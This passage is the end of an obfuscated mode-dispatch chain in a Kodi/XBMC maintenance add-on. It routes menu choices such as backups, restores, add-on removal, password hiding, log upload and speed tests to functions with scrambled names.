 elif iii1Ii == 'grab_addons' : OO ( OOO00o0oO )
 elif iii1Ii == 'grab_builds' : I11ii1i ( OOO00o0oO )
 elif iii1Ii == 'guisettingsfix' : I1iO00O000oOO0oO ( OOO00o0oO , local )
 elif iii1Ii == 'helix' : OO0Ooo0O00ooOo0o ( )
 elif iii1Ii == 'hide_passwords' : o00oO0O000 ( )
 elif iii1Ii == 'ipcheck' : ooooooo ( )
 elif iii1Ii == 'install_from_zip' : IioO0oOo ( )
 elif iii1Ii == 'instructions' : Instructions ( )
 elif iii1Ii == 'instructions_1' : OoOo0Oooo0o ( )
 elif iii1Ii == 'instructions_2' : I11IIIIiII ( )
 elif iii1Ii == 'instructions_3' : Oo0o0OOo0Oo0 ( )
 elif iii1Ii == 'instructions_4' : o00oo00O0OoOo ( )
 elif iii1Ii == 'instructions_5' : I1i1IiIIiIiII ( )
 elif iii1Ii == 'instructions_6' : Instructions_6 ( )
 elif iii1Ii == 'keywords' : Ii1iI ( OOO00o0oO )
 elif iii1Ii == 'kill_xbmc' : OoooOOo0oOO ( )
 elif iii1Ii == 'kodi_settings' : oOoII1IiI1II1 ( )
 elif iii1Ii == 'local_backup' : IIio0O0 ( )
 elif iii1Ii == 'LocalGUIDialog' : O0oOO0o00OO ( )
 elif iii1Ii == 'log' : i111iIi11Ii ( )
 elif iii1Ii == 'login_check' : oo0Ooo ( )
 elif iii1Ii == 'manual_search' : i1IIi1ii1i1ii ( OOO00o0oO )
 elif iii1Ii == 'nan_menu' : OOoo ( )
 elif iii1Ii == 'news_root_menu' : News_Root_Menu ( OOO00o0oO )
 elif iii1Ii == 'news_menu' : News_Menu ( OOO00o0oO )
 elif iii1Ii == 'open_system_info' : Oo0OOO00oo0 ( )
 elif iii1Ii == 'open_filemanager' : oooii111I1I1I ( )
 elif iii1Ii == 'openelec_backup' : O0o00OoooO ( )
 elif iii1Ii == 'openelec_settings' : OOOo0o ( )
 elif iii1Ii == 'play_video' : yt . PlayVideo ( OOO00o0oO )
 elif iii1Ii == 'register' : OO00O0O ( )
 elif iii1Ii == 'remove_addon_data' : II1111i11i11 ( )
 elif iii1Ii == 'remove_addons' : oooOOOoOOOo0O ( OOO00o0oO )
 elif iii1Ii == 'remove_build' : oo0OO0Oo000oo ( )
 elif iii1Ii == 'remove_crash_logs' : OO0o0O0 ( )
 elif iii1Ii == 'remove_nag' : iIiii1iI1i ( )
 elif iii1Ii == 'remove_packages' : iiIi1iIiI ( )
 elif iii1Ii == 'remove_textures' : oo0oOO ( )
 elif iii1Ii == 'restore' : RESTORE ( )
 elif iii1Ii == 'restore_backup' : i11i1O0O0 ( ooo0O , OOO00o0oO , O00Oo )
 elif iii1Ii == 'restore_community' : i111Iii11i1Ii ( ooo0O , OOO00o0oO , oO0OOOO0 , O00Oo , i1IIIIiiI11 , Iii1I11 , I11IIII )
 elif iii1Ii == 'restore_local_CB' : iII11Iii ( OOO00o0oO )
 elif iii1Ii == 'restore_local_gui' : II1i11i1iI1I ( )
 elif iii1Ii == 'restore_local_OE' : OO00O0Oo0oo0oo0 ( )
 elif iii1Ii == 'restore_openelec' : I1IO00O0oO00o ( ooo0O , OOO00o0oO , oO0OOOO0 )
 elif iii1Ii == 'restore_option' : Oo0O ( )
 elif iii1Ii == 'restore_zip' : i1i11IiII ( OOO00o0oO )
 elif iii1Ii == 'run_addon' : O0o0ooo00o00 ( OOO00o0oO )
 elif iii1Ii == 'runtest' : speedtest . runtest ( OOO00o0oO )
 elif iii1Ii == 'search_addons' : I1II1i1iIIi ( OOO00o0oO )
 elif iii1Ii == 'search_builds' : oOoo0O ( OOO00o0oO )
 elif iii1Ii == 'showinfo' : iI1iiI11iii ( OOO00o0oO )
 elif iii1Ii == 'showinfo2' : I111II1 ( OOO00o0oO )
 elif iii1Ii == 'SortBy' : oOOOOOoOOoo0 ( BuildURL , type )
 elif iii1Ii == 'speed_instructions' : iii1I ( )
 elif iii1Ii == 'speedtest_menu' : I1i1i1i ( )
 elif iii1Ii == 'switch_profile_menu' : OO0o0 ( OOO00o0oO )
 elif iii1Ii == 'switch_profile' : Oo000O ( OOO00o0oO )
 elif iii1Ii == 'text_guide' : iIi11111i1II ( OOO00o0oO )
 elif iii1Ii == 'toggleaddon' : IIIIi1iII , OooiIiI1i1Ii = OOO00o0oO . split ( '[]' ) ; i1Iii1ii ( IIIIi1iII , OooiIiI1i1Ii ) ; xbmc . executebuiltin ( 'Container.Refresh' )
 elif iii1Ii == 'tools' : O00o0OO0O ( )
 elif iii1Ii == 'tools_addons' : i111I ( )
 elif iii1Ii == 'tools_clean' : oo00oo ( )
 elif iii1Ii == 'tools_misc' : IiiIIiIii ( )
 elif iii1Ii == 'tutorial_root_menu' : xbmc . executebuiltin ( 'ActivateWindow(Videos, plugin://plugin.video.nantuts, return)' )
 elif iii1Ii == 'unhide_passwords' : IIIIII ( )
 elif iii1Ii == 'update' : iiIiii1IIIII ( )
 elif iii1Ii == 'update_community' : o0o000OOO ( ooo0O , OOO00o0oO , oO0OOOO0 , O00Oo , i1IIIIiiI11 , Iii1I11 , I11IIII )
 elif iii1Ii == 'uploadlog' : IIIiIi1iI ( )
 elif iii1Ii == 'user_info' : OOO00oO0O ( )
 elif iii1Ii == 'xbmc_menu' : XBMC_Menu ( OOO00o0oO )
 elif iii1Ii == 'xbmcversion' : Ooo0o00O0O0oO ( OOO00o0oO )
 elif iii1Ii == 'wipe_xbmc' : III1I111 ( iii1Ii )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) ) # dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
